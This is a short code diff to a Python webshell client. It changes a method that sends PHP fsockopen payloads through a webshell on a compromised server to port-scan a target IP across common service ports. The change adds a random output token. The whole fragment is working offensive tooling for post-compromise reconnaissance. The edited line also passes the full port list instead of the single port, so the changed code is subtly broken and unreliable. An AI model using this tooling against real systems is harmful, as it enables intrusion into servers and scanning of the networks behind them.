@@ -131,11 +131,12 @@ class webshell:
 
 
     def phpportscan(self,ip):
+        token = self.random_string()
         ports = ['21','23','25','79','80','110','135','137','138','139','143','443','445','1433','3306','3389','65534','9000']
         for port in ports:
-            payload = "$ip='{}';$port ={};$fp = @fsockopen($ip, $port, $errno, $errstr, 1);$result = $fp?'开启' : '关闭';echo ' '.$result .' ';".format(ip,port)
+            payload = "$ip='{}';$port ={};$fp = @fsockopen($ip, $port, $errno, $errstr, 1);$result = $fp?'开启' : '关闭';echo '{}'.$result .'{}';".format(ip,ports,token,token)
             try:
-                result = self.get_reuslt_from_server_without_split(payload)
+                result = self.get_result_from_server(payload,token)
                 print(port,result)
             except:
                 return "cant scan"
